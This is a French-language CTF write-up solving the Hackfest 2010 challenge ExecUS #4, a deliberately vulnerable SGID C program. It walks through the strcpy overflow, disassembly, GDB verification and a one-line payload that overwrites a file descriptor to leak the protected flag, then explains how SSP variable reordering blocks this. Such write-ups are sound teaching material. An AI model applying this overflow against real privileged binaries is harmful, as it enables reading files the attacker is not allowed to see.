---
layout: post
title:  "Solution ExecUS #4 du Hackfest 2010"
date:   2010-11-08 00:00:00 -0400
categories: ctf,exploits
---

Ce weekend se tenait le [Hackfest](https://hackfest.ca) 2010 à Québec et le samedi soir son traditionnel CTF. Notre équipe a terminé en 2e place, félicitations à nos bons amis d'Amish Security qui l'ont emporté haut la main.

NOTE: j'utilise ici une version recompilée du binaire, les adresses qui apparaissent dans cette solution ne sont probablement pas les mêmes que celles du binaire original. Si vous voulez l'essayer sur un Linux récent, assurez vous de désactiver le mode SSP:

```
gcc -fno-stack-protector -o execus4 execus4.c 
```

Cet article présente la solution de l'épreuve ExecUS #4, dont voici le code:

```c
#include <fcntl.h>
#include <stdio.h>
#include <strings.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
 
#define SZ 256
 
int main(int argc, char **argv)
{
  int ofd;
  char buf[SZ];
  char oloc[] = "/dev/null";
  char iloc[] = "flag.txt";
  int ifd;
  int len;
 
  printf("Dev null is an awesome 100%% compression ratio, secure, backup device.\n");
 
  if ( argc < 2 )
    exit(0);
 
  ifd = open(iloc, O_RDONLY);
  ofd = open(oloc, O_WRONLY);
 
  strcpy(buf, argv[1]);
 
  if( ifd <= 0x00 || ofd <= 0x00) {
    printf("Error, failed to open files.\n");
    exit(1);
  }
 
  for(bzero(buf,SZ-1); len = read(ifd,buf,SZ-1); bzero(buf,SZ-1) )
    write(ofd,buf,len);
}
```

 Le programme ouvre le fichier flag.txt contenant le flag et le copie dans /dev/null. Le fichier flag.txt n'est pas accessible directement, mais le binaire est configuré avec le bit SGID et le groupe y a accès en lecture.

À la ligne 27, on observe un cas de buffer overflow puisque la taille de argv[1] ne fait l'objet d'aucune vérification au préalable.

```c
strcpy(buf, argv[1]); 
```

En observant l'ordre de déclaration des variables, il est probable que la variable ofd puisse être écrasée, ce que nous pouvons vérifier désassemblant le code:

```
 804856a:    e8 41 fe ff ff           call   80483b0 <open@plt>
 804856f:    89 84 24 28 01 00 00     mov    %eax,0x128(%esp)
 8048576:    c7 44 24 04 01 00 00     movl   $0x1,0x4(%esp)
 804857d:    00
 804857e:    8d 44 24 1a              lea    0x1a(%esp),%eax
 8048582:    89 04 24                 mov    %eax,(%esp)
 8048585:    e8 26 fe ff ff           call   80483b0 <open@plt>
 804858a:    89 84 24 24 01 00 00     mov    %eax,0x124(%esp)
 8048591:    8b 45 0c                 mov    0xc(%ebp),%eax
 8048594:    83 c0 04                 add    $0x4,%eax
 8048597:    8b 00                    mov    (%eax),%eax
 8048599:    89 44 24 04              mov    %eax,0x4(%esp)
 804859d:    8d 44 24 24              lea    0x24(%esp),%eax
 80485a1:    89 04 24                 mov    %eax,(%esp)
 80485a4:    e8 57 fe ff ff           call   8048400 <strcpy@plt>
```

Comme on peut le voir, le résultat du 2e appel à `open()` qui ouvre /dev/null en écriture est écrit à esp+0x124 (`ofd`) et l'adresse à laquelle `strcpy()` écrit `buf` est esp+0x24. La variable `ofd` est donc situé 0x100 octets après `buf`. Convertit en décimal l'espace est de 256 octets, ce qui correspond à la longueur de `buf`.

On peut donc écraser ofd, mais en quoi celà peut-il nous être est utile? Pour le comprendre, il faut se référer au fonctionnement d'UNIX. La variable `ofd` contient ce qu'on appelle un [descripteur de fichier](http://en.wikipedia.org/wiki/File_descriptor) qui est un index dans la table des fichiers ouverts par le processus. Pour tous les processus, le système d'exploitation crée les descripteurs spéciaux suivants :

- Entrée standard (stdin)  : 0
- Sortie standard (stdout) : 1
- Sortie d'erreur (stderr) : 2

La solution est maintenant évidente, il suffit d'écraser `ofd` avec la valeur 1 pour que la clé soit écrite sur la sortie standard et apparaisse à l'écran. Nous allons construire une chaine constituée de 256 caractères pour remplir `buf` suivie de la valeur 1 pour écraser `ofd`. On peut passer cette valeur en paramètre à GDB en utilisant la commande suivante :

```
run $(ruby -e 'print "A" * 256 + "\x01"')
```

On peut vérifier le bon fonctionnement de notre exploit à l'aide de GDB. On commence par mettre un breakpoint juste avant l'appel à `strcpy()` pour examiner la valeur de `ofd`.

```
(gdb) b *0x080485a4
Punto de interrupción 1 at 0x804858a: file execus4.c, line 25.
(gdb) run $(ruby -e 'print "A" * 256 + "\x01"')
Starting program: /home/ekse/code/execus4 $(ruby -e 'print "A" * 256 + "\x01"')
Dev null is an awesome 100% compression ratio, secure, backup device.

Breakpoint 1, 0x080485a4 in main (argc=2, argv=0xbffff3b4)
(gdb) x/x $esp+0x124
0xbffff2f4:    0x00000006
```

La valeur de ofd est actuellement 0x06. Le listing suivant montre que la valeur est bien écrasée par notre overflow.

```
(gdb) nexti
(gdb) x/65x $esp+0x24
0xbffff1f4:    0x41414141    0x41414141    0x41414141    0x41414141
0xbffff204:    0x41414141    0x41414141    0x41414141    0x41414141
0xbffff214:    0x41414141    0x41414141    0x41414141    0x41414141
0xbffff224:    0x41414141    0x41414141    0x41414141    0x41414141
0xbffff234:    0x41414141    0x41414141    0x41414141    0x41414141
0xbffff244:    0x41414141    0x41414141    0x41414141    0x41414141
0xbffff254:    0x41414141    0x41414141    0x41414141    0x41414141
0xbffff264:    0x41414141    0x41414141    0x41414141    0x41414141
0xbffff274:    0x41414141    0x41414141    0x41414141    0x41414141
0xbffff284:    0x41414141    0x41414141    0x41414141    0x41414141
0xbffff294:    0x41414141    0x41414141    0x41414141    0x41414141
0xbffff2a4:    0x41414141    0x41414141    0x41414141    0x41414141
0xbffff2b4:    0x41414141    0x41414141    0x41414141    0x41414141
0xbffff2c4:    0x41414141    0x41414141    0x41414141    0x41414141
0xbffff2d4:    0x41414141    0x41414141    0x41414141    0x41414141
0xbffff2e4:    0x41414141    0x41414141    0x41414141    0x41414141
0xbffff2f4:    0x00000001
(gdb) x/x $esp+0x124
0xbffff2f4:    0x00000001
```

Maintenant que nous savons que notre exploit est fonctionnel, il suffit de lancer le binaire directement pour obtenir le flag (je n'ai malheureusement pas sauvegardé le flag original) .

```
ekse@eclipse:~/code$ ./execus4 $(ruby -e 'print "A" * 256 + "\x01"')
Dev null is an awesome 100% compression ratio, secure, backup device.
LEFLAGDUCHALLENGE
```

### Un mot sur SSP

Le binaire utilisé lors de la compétition n'était pas compilé avec SSP pour facilité la solution. L'utilisation de SSP permet de bloquer cette avenue d'exploitation. Ce n'est pas toutefois pas par l'utilisation du canari (qui faisait d'ailleurs l'objet d'une très bonne présentation par Paul Rascagneres au Hackfest) puisque nous ne cherchons pas à écraser l'adresse de retour. 

La mitigation vient plutôt du fait que SSP réorganise les variables sur la stack pour placer les tableaux après les variables de taille fixe. Le listing suivant montre le même code présenté plus haut mais lorsque le mode SSP est activé:

```
 80485f5:    e8 fa fd ff ff           call   80483f4 <open@plt>
 80485fa:    89 44 24 30              mov    %eax,0x30(%esp)
 80485fe:    c7 44 24 04 01 00 00     movl   $0x1,0x4(%esp)
 8048605:    00
 8048606:    8d 84 24 39 01 00 00     lea    0x139(%esp),%eax
 804860d:    89 04 24                 mov    %eax,(%esp)
 8048610:    e8 df fd ff ff           call   80483f4 <open@plt>
 8048615:    89 44 24 34              mov    %eax,0x34(%esp)
 8048619:    8b 44 24 1c              mov    0x1c(%esp),%eax
 804861d:    83 c0 04                 add    $0x4,%eax
 8048620:    8b 00                    mov    (%eax),%eax
 8048622:    89 44 24 04              mov    %eax,0x4(%esp)
 8048626:    8d 44 24 39              lea    0x39(%esp),%eax
 804862a:    89 04 24                 mov    %eax,(%esp)
 804862d:    e8 12 fe ff ff           call   8048444 <strcpy@plt>
``` 

Comme on peut le voir, la variable `ofd` se trouve à ESP+0x34 et `buf` commence à ESP+0x39. On ne peut donc plus écraser ofd. 